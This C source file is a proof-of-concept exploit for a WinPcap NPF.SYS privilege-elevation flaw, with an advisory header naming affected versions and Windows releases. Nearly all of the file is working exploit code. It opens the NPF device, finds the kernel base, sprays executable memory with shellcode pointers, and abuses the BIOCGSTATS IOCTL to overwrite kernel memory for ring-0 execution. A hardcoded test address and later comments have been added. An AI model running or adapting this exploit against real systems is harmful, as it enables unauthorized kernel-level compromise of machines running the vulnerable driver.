/* 
	WinPcap NPF.SYS Privilege Elevation Vulnerability PoC exploit
	-------------------------------------------------------------

	Affected software: 

	(*) WinPcap versions affected (Confirmed)
	
	- WinPcap 4.0 and previous

	(*) WinPcap fixed version (stable) : WinPcap 4.0.1 

	Note : There was an error in the previous advisory, which tells WinPcap 
	       4.1 is affected, in fact WinPcap 4.1 is the beta version. 

    (*) Operating systems affected (Confirmed)
	
	- Windows 2000 SP4 (Both server and workstation) 
	- Windows XP   SP2
	- Windows 2003 Server
	- Windows Vista !!

	Description:

	It's a well known issue that WinPcap security model allows non-administrator 
	users to use its device driver. If they don't manually unload it after using 
	tools such as Wireshark (ethereal), which unfortunatelly oftenly happens, this 
	can lead to unwanted network traffic sniffing and now with the help of this 
	exploit to kernel mode code execution ;-)	
	
	Remarks:
	
	The exploit code is a PoC and was tested only against Windows XP SP2, with minor 
	modifications (delta offsets and changing VirtualAlloc for NtAllocVirtualMemory due
	to base address restrictions in Windows Vista ) should work on all OSes commented 
	above.

	To test the PoC, just pick any software which uses WinPcap like WireShark, then 
	start to sniff in any iface and close it  (so WinPcap device gets up ). Run the 
	exploit code (as guest user if you want) you should hit an int 3 in kernel mode :-)
			
	Vulnerability discovered by:
	
	Mario Ballano Bárcena,  mballano[_at_]gmail.com 
	
	http://www.48bits.com/
	
	24, April 2007 
		
*/

#define _CRT_SECURE_NO_DEPRECATE

#include <windows.h>
#include <stdio.h>

#define IOCTL_BIOCGSTATS 9031
#define OUT_SIZE 0x10
#define NDRIVERS_LIST 100

enum OSes
{
	OS_WXP=1,
	OS_W2K,
	OS_W2K3,
	OS_VISTA
};

#define WXP_DELTA 0xA67FF; // SP2 Fully patched!!
#define W2K_DELTA 0x0;
#define W2K3_DELTA 0x0;
#define WVISTA_DELTA 0x0;

DWORD  g_dwOsVersion        = 0;
LPVOID g_PatchAddress       = NULL;
LPBYTE g_WXP_PATCH_BYTES    = "\x80\x83\xff\x2C\x75\x2F\x53\xE8\xE1\xA2\xF7\xFF\x89\x45\xDC\x85";
LPBYTE g_W2K_PATCH_BYTES    = "\xCC\xCC\xCC";
LPBYTE g_W2K3_PATCH_BYTES   = "\xCC\xCC\xCC";
LPBYTE g_WVISTA_PATCH_BYTES = "\xCC\xCC\xCC";

typedef BOOL (WINAPI *PENUMDEVICES)(LPVOID*,
									DWORD ,
									LPDWORD);

typedef DWORD (WINAPI *PGETDEVNAME)(LPVOID ImageBase,
									char  *lpBaseName,
									DWORD nSize);

typedef DWORD (WINAPI* PQUERYSYSTEM)(UINT, PVOID, DWORD,PDWORD);

BOOL GetNpfDevice (char *lpNpfDevice)
{
	DWORD  cb,lpType;
	char  *lpList,*tmp;
	HKEY  hkey;
	BOOL   bRes = FALSE;

	lpList = malloc(0x1000);
	memset(lpList,0,0x1000);
	cb = 0x1000;

	if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\EAPOL\\Parameters\\General",0,KEY_READ,&hkey) == ERROR_SUCCESS )
	{
		printf("AQUI");
		if ( RegQueryValueExA( hkey,
							"InterfaceList",
							0,
							&lpType,
							lpList,
							&cb)  == ERROR_SUCCESS )
		{			
			strcpy(lpNpfDevice,"\\\\.\\NPF_");			
			while(*lpList && *lpList !='{') lpList++;
			tmp = lpList;
			while(*lpList && *(lpList) != '}') lpList ++;
			*(++lpList) = '\0';
			strcat(lpNpfDevice,tmp);			
			bRes = TRUE;
		}
		//printf("\n%s\n",lpNpfDevice);

	}	

	//free(lpList); 
	if (!bRes)
	{
		printf("Cannot generate NPF Device Name :-( \n");		
	}
	else
		printf("generating NPF Device Name (: \n");

	return bRes;

}

LPVOID GetNtosBase (VOID)
{
	HANDLE hLib;
	PENUMDEVICES pEnumDeviceDrivers;
	PGETDEVNAME  pGetDeviceDriverBaseName;	
	DWORD  lpcbNeeded,i;
	LPVOID NtosBase = NULL;
	LPVOID *lpImageBases = NULL;
	char   lpBaseName[MAX_PATH];

	if ( ( hLib = LoadLibraryA("psapi.dll")) &&
		 ( pEnumDeviceDrivers = (PENUMDEVICES) GetProcAddress(hLib,"EnumDeviceDrivers") ) &&
		 ( pGetDeviceDriverBaseName = (PGETDEVNAME) GetProcAddress(hLib,"GetDeviceDriverBaseNameA")) )
	{

		lpImageBases = malloc( sizeof(LPVOID) * NDRIVERS_LIST );
		pEnumDeviceDrivers(lpImageBases,sizeof(LPVOID) * NDRIVERS_LIST,&lpcbNeeded);
		
		if ( (lpcbNeeded / sizeof(LPVOID)) > NDRIVERS_LIST)
		{
			lpImageBases = realloc(lpImageBases,sizeof(LPVOID) * lpcbNeeded);
			pEnumDeviceDrivers(lpImageBases,lpcbNeeded,&lpcbNeeded);
		}				

		for (i = 0; i < (lpcbNeeded / sizeof(LPVOID)) ; i++ )
		{
			if ( pGetDeviceDriverBaseName(lpImageBases[i],lpBaseName,MAX_PATH) )
			{
				printf ("%s\n",lpBaseName);
				if (!strcmp(lpBaseName,"ntoskrnl.exe"))
				{					
					NtosBase = lpImageBases[i];
					printf("NTOSKRNL Base found at %#p\n",NtosBase);
					break;
				}
			}				
		}

		free(lpImageBases);
	}

	else
	{
		printf("Cannot Load psapi exports!\n");
	}

	return NtosBase;		 
}

DWORD GetOSVersion (VOID)
{
	OSVERSIONINFOA  osvi;
	DWORD retval = 0;

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);

	if ( GetVersionExA(&osvi) )
	{
		if (osvi.dwMajorVersion == 5)
		{
			switch(osvi.dwMinorVersion)
			{
				case 0:
					retval = OS_W2K;
					break;
				case 1:
					retval = OS_WXP;
					break;
				case 2:
					retval = OS_W2K3;
					break;
			}
		}	

		else if (osvi.dwMajorVersion == 6)
		{
			retval = OS_VISTA;
		}
	}

	g_dwOsVersion = retval;

	return retval;
}


DWORD GetNtosDelta (VOID)
{
	DWORD retval = 0;

	switch(GetOSVersion())
	{
		case OS_VISTA:
			printf("System identified as Windows Vista\n");
			retval = WVISTA_DELTA;
			break;
		case OS_W2K:
			printf("System identified as Windows 2000\n");
			retval = W2K_DELTA;
			break;
		case OS_W2K3:
			printf("System identified as Windows 2003\n");
			retval = W2K3_DELTA;
			break;
		case OS_WXP:
			printf("System identified as Windows XP\n");
			retval = WXP_DELTA;
			break;
		default:
			printf("Unidentified system!\n");
	}

	return retval;
		
}

__declspec( naked ) void ShellCode (VOID)
{	
	// Just debug it, to check code execution ;-)

	__asm int 3;

	// The patch _should_ be done fastly ... that′s why we use global vars...
	
	switch(g_dwOsVersion)
	{
		case OS_VISTA:	
			memcpy( g_PatchAddress, g_WVISTA_PATCH_BYTES,0x10);			
			break;
		case OS_W2K:
			memcpy( g_PatchAddress, g_W2K_PATCH_BYTES,0x10);
			break;
		case OS_WXP:
			memcpy( g_PatchAddress, g_WXP_PATCH_BYTES,0x10);
			break;
		case OS_W2K3:
			memcpy( g_PatchAddress,g_W2K3_PATCH_BYTES,0x10);
			break;
	}

	// Go out without raising an exception ;-), indeed this is inside a SEH frame but ... wtf! :-)

	__asm 
	{ 
		mov  eax, [g_PatchAddress]
		inc  eax
		push eax
		ret
	}
}



int main(int argc, char **argv)
{
	HANDLE       hDevice;
	LPVOID		 lpNtosSwitch;
	DWORD		 cb, delta;
	DWORD		 values[4];
	LPVOID		 lpFakeTable;
	PQUERYSYSTEM NtQuerySystemInformation;
	char		 szNpfDevice[100];
	BYTE		 QueryBuffer[0x24];
	int			 i;	
	
	NtQuerySystemInformation = (PQUERYSYSTEM) GetProcAddress(GetModuleHandleA("NTDLL.DLL"),"NtQuerySystemInformation");	
	
	printf ("Searching for a valid Interface ...\n");
 
	if ( GetNpfDevice(szNpfDevice)==TRUE )
	{
		printf("NPF Device name generated! : %s\n",szNpfDevice);
	}

	else
	{
		printf("Cannot found any valid Interface!\n");
		return 0;
	}

	//为shellcode分配内存堆块
	if ( lpFakeTable = VirtualAlloc((LPVOID)0x570000,
									0x20000,
									MEM_COMMIT|MEM_RESERVE,
									PAGE_EXECUTE_READWRITE) )
	{
		printf("Memory allocated at %p\n",lpFakeTable);	

		for ( i=0; i < ( 0x20000/sizeof(LPVOID) ); i++)
		{
			* ( (LPVOID *)lpFakeTable + i) = ShellCode;			
		}

		printf("Memory mapping filled! ... \n");

	}
	else
	{
		printf("Cannot allocate memory!\n");
		return 0;
	}	

	if ( (hDevice = CreateFileA(szNpfDevice,
		  GENERIC_READ|GENERIC_WRITE,
		  0,
		  0,
		  OPEN_EXISTING,
		  0,
		  NULL) ) != INVALID_HANDLE_VALUE )
	{
		printf("Device %s succesfully opened!\n", szNpfDevice);

		if ( (lpNtosSwitch = GetNtosBase()) && ( delta = GetNtosDelta()) )
		{
			printf("%#p\n",lpNtosSwitch);
			printf("%#p\n",delta);
			//?????????????????????????????????????????????????????????
			g_PatchAddress = (LPVOID) ((LPBYTE) lpNtosSwitch + delta );
			//?????????????????????????????????????????????????????????
												
			if ( DeviceIoControl(hDevice, 
								IOCTL_BIOCGSTATS, 
								(LPVOID)0,0,
								(LPVOID)values,OUT_SIZE,
								&cb,  
								NULL) )
			{
				printf("First time reading ... bytes returned %#x\n",cb);

				for (i = 0;i<4;i++)
				{
					printf ("OutBuffer[i] = %#x\n",values[i]);
				}				
			}			

			printf("Launching exploit ... \nOverwritting NTOSKRNL switch at -> %#p\n",g_PatchAddress);
		
			//test//////////////////////////////////////////
			g_PatchAddress = 0x804E3FD4;//虚拟机
			//g_PatchAddress = 0x864A75EC;
			if ( DeviceIoControl(hDevice, 
								 IOCTL_BIOCGSTATS, 
								(LPVOID)0,0,
								(LPVOID)g_PatchAddress,OUT_SIZE,
								&cb,  
								NULL) )

			{	
				// Dirty trick .. 卑鄙的行为				
				NtQuerySystemInformation(0x15,QueryBuffer,sizeof(QueryBuffer), NULL);
				// Bye bye god mode!
				printf("We are back from ring0!\n");
			}
			else
			{
				printf("DeviceIoControl again Failed!\n");
			}
		}
	}

	else
	{
		printf("Error: Cannot open device %s\n",szNpfDevice);
	}
}

// milw0rm.com [2007-07-10]
